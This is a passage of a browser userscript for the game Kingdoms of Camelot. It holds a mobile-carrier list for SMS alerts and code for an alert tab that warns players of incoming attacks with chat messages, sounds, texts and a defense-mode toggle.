Airtel" }, 24: { 'country': "INDIA", 'provider': "Chennel RPG Cellular" }, 25: { 'country': "INDIA", 'provider': "Delhi Airtel" }, 26: { 'country': "INDIA", 'provider': "Delhi Hutch" }, 27: { 'country': "INDIA", 'provider': "Gujarat Idea Cellular" }, 28: { 'country': "INDIA", 'provider': "Gujaret Airtel" }, 29: { 'country': "INDIA", 'provider': "Gujaret Celforce" }, 30: { 'country': "INDIA", 'provider': "Goa Airtel" }, 31: { 'country': "INDIA", 'provider': "Goa BPL Mobile" }, 32: { 'country': "INDIA", 'provider': "Goa Idea Cellular" }, 33: { 'country': "INDIA", 'provider': "Haryana Airtel" }, 34: { 'country': "INDIA", 'provider': "Haryana Escotel" }, 35: { 'country': "INDIA", 'provider': "Himachal Pradesh Airtel" }, 36: { 'country': "INDIA", 'provider': "Karnataka Airtel" }, 37: { 'country': "INDIA", 'provider': "Kerala Airtel" }, 38: { 'country': "INDIA", 'provider': "Kerala Escotel" }, 39: { 'country': "INDIA", 'provider': "Kerala BPL Mobile" }, 40: { 'country': "INDIA", 'provider': "Kolkata Airtel" }, 41: { 'country': "INDIA", 'provider': "Madhya Pradesh Airtel" }, 42: { 'country': "INDIA", 'provider': "Maharashtra Airtel" }, 43: { 'country': "INDIA", 'provider': "Maharashtra BPL Mobile" }, 44: { 'country': "INDIA", 'provider': "Maharashtra Idea Cellular" }, 45: { 'country': "INDIA", 'provider': "Mumbai Airtel" }, 46: { 'country': "INDIA", 'provider': "Mumbai BPL Mobile" }, 47: { 'country': "INDIA", 'provider': "Punjab Airtel" }, 48: { 'country': "INDIA", 'provider': "Pondicherry BPL Mobile" }, 49: { 'country': "INDIA", 'provider': "Tamil Nadu Airtel" }, 50: { 'country': "INDIA", 'provider': "Tamil Nadu BPL Mobile" }, 51: { 'country': "INDIA", 'provider': "Tamil Nadu Aircel" }, 52: { 'country': "INDIA", 'provider': "Uttar Pradesh West Escotel" }, 53: { 'country': "IRELAND", 'provider': "Meteor" }, 54: { 'country': "IRELAND", 'provider': "Meteor MMS" }, 55: { 'country': "ITALY", 'provider': "TIM" }, 56: { 'country': "ITALY", 'provider': "Vodafone" }, 57: { 'country': "JAPAN", 'provider': "AU by KDDI" }, 58: { 'country': "JAPAN", 'provider': "NTT DoCoMo" }, 59: { 'country': "JAPAN", 'provider': "Vodafone Chuugoku/Western" }, 60: { 'country': "JAPAN", 'provider': "Vodafone Hokkaido" }, 61: { 'country': "JAPAN", 'provider': "Vodafone Hokuriko/Central North" }, 62: { 'country': "JAPAN", 'provider': "Vodafone Kansai/West, including Osaka" }, 63: { 'country': "JAPAN", 'provider': "Vodafone Kanto/Koushin/East including Tokyo" }, 64: { 'country': "JAPAN", 'provider': "Vodafone Kyuushu/Okinawa" }, 65: { 'country': "JAPAN", 'provider': "Vodafone Shikoku" }, 66: { 'country': "JAPAN", 'provider': "Vodafone Touhoku/Niigata/North" }, 67: { 'country': "JAPAN", 'provider': "Vodafone Toukai/Central" }, 68: { 'country': "JAPAN", 'provider': "Willcom" }, 69: { 'country': "JAPAN", 'provider': "Willcom di" }, 70: { 'country': "JAPAN", 'provider': "Willcom dj" }, 71: { 'country': "JAPAN", 'provider': "Willcom dk" }, 72: { 'country': "NETHERLANDS", 'provider': "T-Mobile" }, 73: { 'country': "NETHERLANDS", 'provider': "Orange" }, 74: { 'country': "SINGAPORE", 'provider': "M1" }, 75: { 'country': "SOUTH AFRICA", 'provider': "Vodacom" }, 76: { 'country': "SPAIN", 'provider': "Telefonica Movistar" }, 77: { 'country': "SPAIN", 'provider': "Vodafone" }, 78: { 'country': "SWEDEN", 'provider': "Tele2" }, 79: { 'country': "UNITED STATES", 'provider': "Teleflip" }, 80: { 'country': "UNITED STATES", 'provider': "Alltel" }, 81: { 'country': "UNITED STATES", 'provider': "Ameritech" }, 82: { 'country': "UNITED STATES", 'provider': "ATT Wireless" }, 83: { 'country': "UNITED STATES", 'provider': "Bellsouth" }, 84: { 'country': "UNITED STATES", 'provider': "Boost" }, 85: { 'country': "UNITED STATES", 'provider': "CellularOne" }, 86: { 'country': "UNITED STATES", 'provider': "CellularOne MMS" }, 87: { 'country': "UNITED STATES", 'provider': "Cingular" }, 88: { 'country': "UNITED STATES", 'provider': "Edge Wireless" }, 89: { 'country': "UNITED STATES", 'provider': "Sprint PCS" }, 90: { 'country': "UNITED STATES", 'provider': "T-Mobile" }, 91: { 'country': "UNITED STATES", 'provider': "Metro PCS" }, 92: { 'country': "UNITED STATES", 'provider': "Nextel" }, 93: { 'country': "UNITED STATES", 'provider': "O2" }, 94: { 'country': "UNITED STATES", 'provider': "Orange" }, 95: { 'country': "UNITED STATES", 'provider': "Qwest" }, 96: { 'country': "UNITED STATES", 'provider': "Rogers Wireless" }, 97: { 'country': "UNITED STATES", 'provider': "Telus Mobility" }, 98: { 'country': "UNITED STATES", 'provider': "US Cellular" }, 99: { 'country': "UNITED STATES", 'provider': "Verizon" }, 100: { 'country': "UNITED STATES", 'provider': "Virgin Mobile" }, 101: { 'country': "UNITED KINGDOM", 'provider': "O2 1" }, 102: { 'country': "UNITED KINGDOM", 'provider': "O2 2" }, 103: { 'country': "UNITED KINGDOM", 'provider': "Orange" }, 104: { 'country': "UNITED KINGDOM", 'provider': "T-Mobile" }, 105: { 'country': "UNITED KINGDOM", 'provider': "Virgin Mobile" }, 106: { 'country': "UNITED KINGDOM", 'provider': "Vodafone" }, 107: { 'country': "BELGIUM", 'provider': "mobistar" }, 108: { 'country': "GERMANY", 'provider': "1und1" }, 109: { 'country': "UNITED STATES", 'provider': "MyCricket" }, 110: { 'country': "Philippines", 'provider': "Smart" }, 111: { 'country': "UNITED STATES", 'provider': "CellularSouth" }, 112: { 'country': "UNITED STATES", 'provider': "Viaero" }, 113: { 'country': "CANADA", 'provider': "Wind Mobile" } },

 init: function(div){
  var t = Tabs.tower;
  t.myDiv = div;
  if (Options.scStopSound) {
  AddTowerTab(''+culang.stopsound+'', t.stopSoundAlerts, 'pbtowertab');
  }
  if (GM_getValue ('towerMarches_'+getServerId()) != null)
    GM_deleteValue ('towerMarches_'+getServerId());   // remove deprecated data if it exists
   
  var m = '<DIV class=pdxStat>'+culang.Hsac+' - '+culang.Hsettings+'</div><TABLE class=pdxTab><TR align=center>';

  for (var i=0; i<Cities.cities.length; i++)
    m += '<TD width=95><SPAN id=pbtacity_'+ i +'>' + Cities.cities[i].name + '</span></td>';
  m += '</tr><TR align=center>';
  for (var cityId in Cities.byID)
  m += '<TD><INPUT type=submit id=pdxTabut_'+ cityId +' value=""></td>';
  m += '</tr><TR align=center>';
  for (var cityId in Cities.byID)
   m += '<TD><CENTER><INPUT id=pbattackqueue_' + cityId + ' type=submit value="A 0 | S 0"></center></td>';
  m += '</tr></table><BR><DIV><CENTER><INPUT id=pbSoundStop type=submit value="'+culang.STstopsound+'"></center></div><DIV id=pbSwfPlayer></div>';
  m += '<BR><DIV class=pdxStat>'+culang.Htower+' - '+culang.Hsettings+'</div><TABLE class=pdxTab><tr><td width="20" align=left><INPUT id=pbcellenable type=checkbox '+ (Options.celltext.atext?'CHECKED ':'') +'/></td>\
    <td align=left>'+culang.Osms2mail+': <INPUT id=pbnum1 type=text size=4 maxlength=4 value="'+ Options.celltext.num1 +'"  '+(Options.celltext.provider==0?'DISABLED':'')+'\>&nbsp;<INPUT id=pbnum2 type=text size=3 maxlength=3 value="'+ Options.celltext.num2 +'" '+(Options.celltext.provider==0?'DISABLED':'')+'\>&nbsp;<INPUT id=pbnum3 type=text size=5 maxlength=5 value="'+ Options.celltext.num3 +'" '+(Options.celltext.provider==0?'DISABLED':'')+'\> '+culang.smssend+' </td>\
   <td width="48" align=left><INPUT id=paMailHelp type=submit value="'+culang.helpbutton+'"></td></tr><tr><td></td> <TD colspan="2" align=left>'+culang.land+': <select id="pbfrmcountry">';
 for (var i in t.Providers) {
 var ret=m.indexOf(t.Providers[i].country);
 if (ret==-1) {
 if (t.Providers[i].country==t.Providers[Options.celltext.provider].country) {
 m += '<option value="'+t.Providers[i].country+'" selected="selected">'+t.Providers[i].country+'</option>'; // Load Previous Provider Selection
 }
 else {
 m += '<option value="'+t.Providers[i].country+'">'+t.Providers[i].country+'</option>';
 }
 }
 }
 m += '</select>\
 <select id="pbfrmprovider" '+(Options.celltext.provider==0?'DISABLED':'')+'><option value=0 >--'+culang.provider+'--</option>';
 for (var i in t.Providers) {
 if(t.Providers[i].country == t.Providers[Options.celltext.provider].country)
 if(Options.celltext.provider == i)
 m += '<option value="'+i+'" selected="selected">'+t.Providers[i].provider+'</option>'; // Load Previous Provider Selection
 else
 m += '<option value="'+i+'">'+t.Providers[i].provider+'</option>';
 }
 m += '</select></td></tr>\
		<TR><TD>&nbsp;</td><TD colspan="2">&nbsp;</td></tr>\
		<TR><TD><INPUT id=pbalertEnable type=checkbox '+ (Options.alertConfig.aChat?'CHECKED ':'') +'/></td><TD colspan="2">'+culang.STshowinc+'</td></tr>\
		<TR><TD></td><TD colspan="2"><TABLE cellpadding=0 cellspacing=0>\
		<TR><TD align=right>'+culang.STmessage +': &nbsp; </td><TD><INPUT id=pbalertPrefix type=text size=60 maxlength=120 value="'+ Options.alertConfig.aPrefix +'" \></td></tr>		<TR><TD align=right>'+culang.STonscout +': &nbsp; </td><TD><INPUT id=pbalertScout type=checkbox '+ (Options.alertConfig.scouting?'CHECKED ':'') +'/></td></tr>		<TR><TD align=right>'+culang.STonwild +': &nbsp; </td><TD><INPUT id=pbalertWild type=checkbox '+ (Options.alertConfig.wilds?'CHECKED ':'') +'/></td></tr>		<TR><TD align=right>'+culang.STshowdef +': &nbsp; </td><TD><INPUT id=pbalertDefend type=checkbox '+ (Options.alertConfig.defend?'CHECKED ':'') +'/></td></tr>		<TR><TD align=right>'+culang.STmessage +' '+culang.def+':&nbsp;</td><TD><INPUT id=pbalertDefendMSG type=text size=60 maxlength=160 value="'+ Options.defendMessage +'" \></td></tr>		<TR><TD align=right>'+culang.STmessage +' '+culang.hide+':&nbsp;</td><TD><INPUT id=pbalertHide type=text size=60 maxlength=160 value="'+ Options.hideMessage +'" \></td></tr>		<TR><TD align=right>'+culang.STviccity+'&nbsp;&nbsp; </td><TD><span id=pbalerterr><INPUT id=pbincludeCityName type=checkbox '+ (Options.includeCityName?'CHECKED ':'') +'/>		</span></td></tr><TR><TD align=right>'+culang.STvicdip+'</td><TD><INPUT id=pbincludeAlliance type=checkbox '+ (Options.includeAlliance?'CHECKED ':'') +'/></td></tr><TR>		<TD align=right>'+culang.victim+' &nbsp;'+culang.might+':</td><TD><INPUT id=pbincludeMight type=checkbox '+ (Options.includeMight?'CHECKED ':'') +'/></td>		</tr><TR><TD align=right>'+culang.STtroops +':</td><TD><INPUT id=pbalertTroops type=text size=7 value="'+ Options.alertConfig.minTroops +'" \></td></tr>		</tr><TR><TD align=right>'+culang.STstopraids+':</td><TD><INPUT id=pbalertraid type=checkbox '+ (Options.alertConfig.raid?'CHECKED':'') +'/></td></tr>		</table></td></tr>\
		<TR><TD><BR></td></tr>\
		<TR><TD><INPUT id=pbSoundEnable type=checkbox '+ (Options.alertSound.enabled?'CHECKED ':'') +'/></td><TD colspan="2">'+culang.STplaysound+' <select id=pbalert>\
		<option value="'+mainSoundSource+'sirene.mp3" ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'alarm.mp3'?'SELECTED':'') + '>'+culang.SDefault+'</option>		<option value='+mainSoundSource+'muahaha.MP3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'muahaha.MP3'?'SELECTED':'') + '>'+culang.SMuahaha1+'</option>		<option value='+mainSoundSource+'muahaha2.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'muahaha2.mp3'?'SELECTED':'') + '>'+culang.SMuahaha2+'</option>		<option value='+mainSoundSource+'muahaha3.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'muahaha3.mp3'?'SELECTED':'') + '>'+culang.SMuahaha3+'</option>		<option value='+mainSoundSource+'punch.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'punch.mp3'?'SELECTED':'') + '>'+culang.SPunch+'</option>		<option value='+mainSoundSource+'phone.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'phone.mp3'?'SELECTED':'') + '>'+culang.SPhone+'</option>		<option value='+mainSoundSource+'police.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'police.mp3'?'SELECTED':'') + '>'+culang.SPolice+'</option>		<option value='+mainSoundSource+'piepen.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'piepen.mp3'?'SELECTED':'') + '>'+culang.SBeep+'</option>		<option value='+mainSoundSource+'schrei.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'schrei.mp3'?'SELECTED':'') + '>'+culang.SScreem+'</option>		<option value='+mainSoundSource+'unstable.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'unstable.mp3'?'SELECTED':'') + '>'+culang.SUnstable+'</option>		<option value='+mainSoundSource+'waring.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'waring.mp3'?'SELECTED':'') + '>'+culang.SWaring+'</option>		<option value='+mainSoundSource+'western.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'western.mp3'?'SELECTED':'') + '>'+culang.SWestern+'</option>		<option value='+mainSoundSource+'jacnoho-special.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'jacnoho-special.mp3'?'SELECTED':'') + '>jacnoho</option>		<option value='+mainSoundSource+'jacnoho-special-2.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'jacnoho-special-2.mp3'?'SELECTED':'') + '>jacnoho2</option>\
		<option value='+mainSoundSource+'skyandsand.mp3 ' + (Options.alertSound.towerSoundURL==''+mainSoundSource+'skyandsand.mp3'?'SELECTED':'') + '>Sky and Sand</option>\
		</select> <a href="http://koc.god-like.org/?p=149" target="_blank">'+culang.STlinklist+'</a> - <a href="https://code.google.com/p/koc-power-pdx/issues/entry" target="_blank">'+culang.uploadSounds+'</a>! ('+culang.attachFile+') </td></tr>\
		<TR><TD></td><td colspan="2">\
		<DIV id=pbLoadingSwf>'+culang.dlswf+'</div><DIV style="display:none" id=pbSoundOpts><TABLE cellpadding=0 cellspacing=0>\
		<TR><TD align=right>'+culang.STmp3+': &nbsp; </td><TD><INPUT id=pbsoundFile type=text size=55 maxlength=160 value="'+ Options.alertSound.towerSoundURL +'" \>\
		&nbsp; </td><TD><INPUT id=pbSoundLoad type=submit value=Download><INPUT id=pbSoundDefault type=submit value="'+culang.reset+'"></td></tr>\
		<TR><TD align=right>'+culang.vol+': &nbsp; </td><TD><TABLE cellpadding=0 cellspacing=0 class=pdxTab><TR valign=middle><TD><SPAN id=pbVolSlider></span></td><TD width=15></td><TD align=right id=pbVolOut>0</td></td></table></td><TD align=center><SPAN id=pbLoadStat>xx</span></td></tr>\
		<TR><TD align=right><INPUT id=pbSoundRepeat type=checkbox '+ (Options.alertSound.repeat?'CHECKED ':'') +'/></td><TD> '+culang.STplayevery+' <INPUT id=pbSoundEvery type=text size=2 maxlength=5 value="'+ Options.alertSound.repeatDelay +'"> '+culang.STplaymin+'</td></tr>\
		<TR><TD></td><TD>'+culang.STand+' <INPUT id=pbSoundLength type=text size=3 maxlength=5 value="'+ Options.alertSound.playLength +'"> '+culang.STplayfor+'</td></tr>\
		<TR><TD></td><TD><INPUT type=submit value="'+culang.play+'" id=pbPlayNow></td></tr></table></div><td width="10"></td></tr>\
		</table><BR>';
  t.myDiv.innerHTML = m;
  
  t.mss = new CmatSimpleSound(pdxTowerSWFplayer, null, {height:0, width:0}, t.e_swfLoaded, 'debug=n');
  t.mss.swfDebug = function (m){ logit ('SWF: '+ m)};
  t.mss.swfPlayComplete = t.e_soundFinished;
  t.mss.swfLoadComplete = t.e_soundFileLoaded;
  unsafeWindow.matSimpleSound01 = t.mss;   // let swf find it

  t.volSlider = new SliderBar (document.getElementById('pbVolSlider'), 200, 21, 0);
  t.volSlider.setChangeListener(t.e_volChanged);
  document.getElementById('paMailHelp').addEventListener ('click', t.mailHelpPop, false);
  document.getElementById('pbPlayNow').addEventListener ('click', function (){t.playSound(false)}, false);
  document.getElementById('pbSoundStop').addEventListener ('click', t.stopSoundAlerts, false);
  document.getElementById('pbSoundRepeat').addEventListener ('change', function (e){Options.alertSound.repeat = e.target.checked}, false);
  document.getElementById('pbSoundEvery').addEventListener ('change', function (e){Options.alertSound.repeatDelay = e.target.value}, false);
  document.getElementById('pbSoundLength').addEventListener ('change', function (e){Options.alertSound.playLength = e.target.value}, false);
  document.getElementById('pbSoundEnable').addEventListener ('change', function (e){Options.alertSound.enabled = e.target.checked}, false);
  document.getElementById('pbcellenable').addEventListener ('change', function (e){Options.celltext.atext = e.target.checked;}, false);

  document.getElementById('pbSoundStop').disabled = true;
  document.getElementById('pbalertEnable').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbincludeMight').addEventListener    ('change', t.e_alertOptChanged, false);
  document.getElementById('pbincludeAlliance').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbincludeCityName').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertPrefix').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertScout').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertWild').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertDefend').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertDefendMSG').addEventListener ('change', t.e_alertOptChanged, false);

  document.getElementById('pbalertHide').addEventListener       ('change', t.e_alertOptChanged, false);
  document.getElementById('pbalertTroops').addEventListener ('change', t.e_alertOptChanged, false);
  document.getElementById('pbfrmcountry').addEventListener ('change', t.setCountry, false);
  document.getElementById('pbfrmprovider').addEventListener ('change', t.setProvider, false);
  document.getElementById('pbnum1').addEventListener ('change', t.phonenum, false);
  document.getElementById('pbnum2').addEventListener ('change', t.phonenum, false);
  document.getElementById('pbnum3').addEventListener ('change', t.phonenum, false);
  document.getElementById('pbalertraid').addEventListener ('change', t.e_alertOptChanged, false);

  document.getElementById('pbsoundFile').addEventListener ('change', function (){    Options.alertSound.towerSoundURL = document.getElementById('pbsoundFile').value;    t.loadUrl (Options.alertSound.towerSoundURL);    }, false);
  document.getElementById('pbalert').addEventListener ('change', function (){    Options.alertSound.towerSoundURL = document.getElementById('pbalert').value;    document.getElementById('pbsoundFile').value = document.getElementById('pbalert').value;    t.loadUrl (Options.alertSound.towerSoundURL);    }, false);
  document.getElementById('pbSoundDefault').addEventListener ('click', function (){    document.getElementById('pbsoundFile').value = ''+mainSoundSource+'sirene.mp3';    Options.alertSound.towerSoundURL = ''+mainSoundSource+'sirene.mp3';    t.loadUrl (''+mainSoundSource+'sirene.mp3');    }, false);
  for (var cityId in Cities.byID){    var but = document.getElementById ('pdxTabut_'+ cityId);    addListener (but, cityId);    t.defMode[cityId] =  parseInt(Seed.citystats["city" + cityId].gate);    t.displayDefMode (cityId);  var btnNameT = 'pbattackqueue_' + cityId;    addTowerEventListener(cityId, btnNameT);  }
  function addListener (but, i){    but.addEventListener ('click', function (){t.butToggleDefMode(i)}, false);  }
  function addTowerEventListener(cityId, name){ document.getElementById(name).addEventListener('click', function(){      t.showTowerIncoming(cityId);    }, false);  }  
  setInterval (t.eachSecond, 2000);
  },      
	show : function (){  var t = Tabs.tower;   mainPop.div.style.width = 750 + 'px';   if (Options.widescreen==true) { mainPop.div.style.width = Colors.PopUpWidth + 'px'; }  },
	hide : function (){  var t = Tabs.tower;  },
	mailHelpPop : function (){  var helpmailText = ''+culang.helpmailText+'';  var pop = new CPopup ('giftHelp', 0, 0, 746, 100, true);  pop.centerMe (mainPop.getMainDiv());    pop.getMainDiv().innerHTML = helpmailText;  pop.getTopDiv().innerHTML = '<div class=showBadged><CENTER>'+culang.sms2mail+'</center></div>';  pop.show (true);  },
	loadUrl : function (url){  var t = Tabs.tower;  t.mss.load (1, url, true);  document.getElementById('pbLoadStat').innerHTML = 'Loading';  },
	phonenum : function() { Options.celltext.num1 = document.getElementById('pbnum1').value; Options.celltext.num2 = document.getElementById('pbnum2').value; Options.celltext.num3 = document.getElementById('pbnum3').value; saveOptions(); },

 setCountry : function(){
 var t = Tabs.tower;
 var myselect=document.getElementById("pbfrmprovider");
 myselect.innerHTML = '<option value=0 >--'+culang.provider+'--</option>';
 myselect.disabled = true;
 for (var i in t.Providers) {
 if (t.Providers[i].country == document.getElementById("pbfrmcountry").value){
 var addoption = document.createElement('option');
 addoption.value = i;
 addoption.text = t.Providers[i].provider;
 myselect.add(addoption, null) //add new option to end of "Providers"
 }
 }
 myselect.disabled = false;
 },

 setProvider : function(){
 var ddProvider = document.getElementById("pbfrmprovider").wrappedJSObject;
 Options.celltext.provider=ddProvider.options[ddProvider.selectedIndex].value;
 if(ddProvider.selectedIndex > 0){ document.getElementById("pbnum1").disabled = false; document.getElementById("pbnum2").disabled = false; document.getElementById("pbnum3").disabled = false; } else { document.getElementById("pbnum1").disabled = true; document.getElementById("pbnum2").disabled = true; document.getElementById("pbnum3").disabled = true; }
 //alert(Options.celltext.provider);
 },     
  e_swfLoaded : function (){
  var t = Tabs.tower;
  document.getElementById('pbLoadingSwf').style.display = 'none';
  document.getElementById('pbSoundOpts').style.display = 'inline';
  t.volSlider.setValue (Options.alertSound.volume/100);
  t.loadUrl (Options.alertSound.towerSoundURL);
  setTimeout (function (){t.mss.setVolume (1, Options.alertSound.volume);}, 500);
  if (Options.alertSound.alarmActive && Options.alertSound.expireTime>unixTime())   {       t.soundTheAlert();	}
  },
  
e_alertOptChanged : function (){
  var t = Tabs.tower;
  Options.alertConfig.aChat = document.getElementById('pbalertEnable').checked;
  Options.alertConfig.aPrefix=document.getElementById('pbalertPrefix').value;
  Options.defendMessage=document.getElementById('pbalertDefendMSG').value;
  Options.includeMight=document.getElementById('pbincludeMight').checked;
  Options.includeAlliance=document.getElementById('pbincludeAlliance').checked;
  Options.includeCityName=document.getElementById('pbincludeCityName').checked;
  Options.hideMessage=document.getElementById('pbalertHide').value;
  Options.alertConfig.scouting=document.getElementById('pbalertScout').checked;      
  Options.alertConfig.wilds=document.getElementById('pbalertWild').checked;
  Options.alertConfig.defend=document.getElementById('pbalertDefend').checked;
  Options.alertConfig.raid=document.getElementById('pbalertraid').checked;
  
  var mt = parseInt(document.getElementById('pbalertTroops').value);
  if (mt<1 || mt>120000){    document.getElementById('pbalertTroops').value = Options.alertConfig.minTroops;    document.getElementById('pbalerterr').innerHTML = '<font color=#600000><B>INVALID</b></font>';    setTimeout (function (){document.getElementById('pbalerterr').innerHTML =''}, 2000);    return;  }
  Options.alertConfig.minTroops = mt;
saveOptions();
  },
  
  e_volChanged : function (val){  var t = Tabs.tower;  document.getElementById('pbVolOut').innerHTML = parseInt(val*100);  Options.alertSound.volume = parseInt(val*100);  t.mss.setVolume (1, Options.alertSound.volume);  },
  
  butToggleDefMode : function (cityId){
  var t = Tabs.tower;
  var mode = 1;
  if (Seed.citystats["city" + cityId].gate != 0)
    mode = 0;
  t.ajaxSetDefMode (cityId, mode, function (newMode){    t.defMode[cityId] = newMode;    t.displayDefMode (cityId);    });
  },
    
  displayDefMode : function (cityId){  var t = Tabs.tower;  var but = document.getElementById('pdxTabut_'+ cityId);  if (t.defMode[cityId]){    but.className = 'pbDefButOn';    but.value = ''+culang.stdef+' = '+culang.buttonon;    } else {    but.className = 'pbDefButOff';    but.value = ''+culang.stdef+' = '+culang.buttonoff;  }  },
  eachSecond : function (){
  var t = Tabs.tower;
  for (var cityId in Cities.byID){ if (Seed.citystats["city" + cityId].gate != t.defMode[cityId]){       t.defMode[cityId] = Seed.citystats["city"+ cityId].gate;    t.displayDefMode (cityId);    }	 Options.alertConfig.raidautoswitch[cityId] = false;  }
  var now = unixTime();
var incomming = false;
  if (matTypeof(Seed.queue_atkinc) != 'array'){
    for (var k in Seed.queue_atkinc){   // check each incoming march
    var m = Seed.queue_atkinc[k];
    if ((m.marchType==3 || m.marchType==4) && parseIntNan(m.arrivalTime)>now){
      if (m.departureTime > Options.alertConfig.lastAttack){
      Options.alertConfig.lastAttack = m.departureTime;  
      t.newIncoming (m);
      }          
 incomming = true;
  if (Options.alertConfig.raid){
			Options.alertConfig.raidautoswitch[m.toCityId] = true;
			}
		}
    }
}
  if (Options.alertSound.alarmActive && (now > Options.alertSound.expireTime))
    t.stopSoundAlerts();

    t.towerMarches = [];
    for (var i = 0; i < Cities.cities.length; i++) {
      var cId = Cities.cities[i].id;
      t['attackCount_' + cId] = 0;
      t['scoutCount_' + cId] = 0;
    }
    if (matTypeof(Seed.queue_atkinc) != 'array') {
      for (var k in Seed.queue_atkinc) {
        var m = Seed.queue_atkinc[k];
        if ((m.marchType == 3 || m.marchType == 4) && parseIntNan(m.arrivalTime) > now) {
          t.handleTowerData(m);

        }
      }
    }
    for (var i = 0; i < Cities.cities.length; i++) {
      var cId = Cities.cities[i].id;
      document.getElementById('pbattackqueue_' + cId).value = 'A ' + t['attackCount_' + cId] + ' | S ' + t['scoutCount_' + cId];
    }
  
  },   
  
  e_soundFinished : function (chan){ // called by SWF when sound finishes playing
  var t = Tabs.tower;
  if (chan != 1)
    return;
  if (!Options.alertSound.alarmActive){
    document.getElementById('pbSoundStop').disabled = true;
  }
  },

  e_soundFileLoaded : function (chan, isError){ // called by SWF when sound file finishes loading
  if (chan != 1)
    return;
  if (isError)  
    document.getElementById('pbLoadStat').innerHTML = ''+culang.error+'!';
  else
    document.getElementById('pbLoadStat').innerHTML = ''+culang.done+'!';
  },  
  
  playSound : function (doRepeats){
  var t = Tabs.tower;
  document.getElementById('pbSoundStop').disabled = false;
  clearTimeout (t.soundStopTimer);
  clearTimeout (t.soundRepeatTimer);
  t.mss.play (1, 0);
  t.soundStopTimer = setTimeout (function(){t.mss.stop(1); t.e_soundFinished(1)}, Options.alertSound.playLength*1000);
  if (doRepeats && Options.alertSound.repeat)
    t.soundRepeatTimer = setTimeout (function (){t.playSound(true)}, Options.alertSound.repeatDelay*60000);
  else
    Options.alertSound.alarmActive = false;
  },
    
  soundTheAlert : function (){
  var t = Tabs.tower;
  Options.alertSound.alarmActive = true;
  t.playSound(true);
  },
   
stopSoundAlerts : function (){
	var t = Tabs.tower;
	obj = document.getElementById('pbSoundStop');
	t.mss.stop (1);
	clearTimeout (t.soundStopTimer);
	clearTimeout (t.soundRepeatTimer);
	document.getElementById('pbSoundStop').disabled = true;
	Options.alertSound.alarmActive = false;
	Options.alertSound.expireTime = 0;
	if (Options.scStopSound) {
		createRedButton(''+culang.stopsound+'', 'pbtowertab');
	}
},
newIncoming : function (m){
  var t = Tabs.tower;
   t.postToChat (m);
},
sendalert : function (m){
var t = Tabs.tower;
  var now = unixTime();
  if (Options.celltext.atext)
   t.postToCell (m);
  if (Options.alertSound.enabled){
    t.soundTheAlert(m);
    if (m.arrivalTime > Options.alertSound.expireTime)
    Options.alertSound.expireTime = m.arrivalTime;
  }
if (Options.alertConfig.raid){
 			Tabs.Raid.StopCityRaids(m.toCityId);
 			Options.alertConfig.raidautoswitch[m.toCityId] = true;
		}
  },

  ajaxSetDefMode : function (cityId, state, notify){
  var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
  params.cid = cityId;
  params.state = state;
  new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/gate.php" + unsafeWindow.g_ajaxsuffix, {
    method: "post",
    parameters: params,
    onSuccess: function (rslt) {
    if (rslt.ok) {
      Seed.citystats["city" + cityId].gate = state;
      notify (state);
    }
    },
    onFailure: function () {
    }
  })
  },
  
  onUnload : function (){
  },
  postToCell : function (m){
 var t = Tabs.tower;
 var data = {};
 if (m.marchType == null) // bogus march (returning scouts)
 return;
 if (m.marchType == 3){
 if (!Options.alertConfig.scouting)
 return;
 data.atkType = 'SPAEHEN';
 } else if (m.marchType == 4){
 data.atkType = 'ANGRIFF';
 } else {
 return;
 }
 var city = Cities.byID[m.toCityId];
 if ( city.tileId == m.toTileId )
 data.target = 'HEILIGTUM ('+ city.x +','+ city.y+')';
 else {
 if (!Options.alertConfig.wilds)
 return;
 data.target = 'WILDNISS';
 for (k in Seed.wilderness['city'+m.toCityId]){
 if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
 data.target += Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord;
 break;
 }
 }
 }
 if (Seed.players['u'+m.pid])
 data.who = Seed.players['u'+m.pid].n;
 else if (m.players && m.players['u'+m.pid])
 data.who = m.players['u'+m.pid].n;
 else
 data.who = ''+culang.botStatUnknown+'';

 if (m.fromXCoord)
 data.who += m.fromXCoord +','+ m.fromYCoord;
 data.arrival = unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime()));
 var totTroops = 0;
 data.totTroops = ' '
 for (k in m.unts){
 var uid = parseInt(k.substr (1));
 data.totTroops += m.unts[k] +' '+ unsafeWindow.unitcost['unt'+uid][0] +', ';
 totTroops += m.unts[k];
 }
 if (totTroops < Options.alertConfig.minTroops)
 return;

 if ( city.tileId == m.toTileId ){
 var emb = getCityBuilding(m.toCityId, 8);
 if (emb.count > 0){
 var availSlots = emb.maxLevel;
 for (k in Seed.queue_atkinc){
 if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
 --availSlots;
 }
 }
 data.embassy = 'BOTSCHAFT '+ availSlots +' '+culang.from+' '+ emb.maxLevel;
 if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
 {
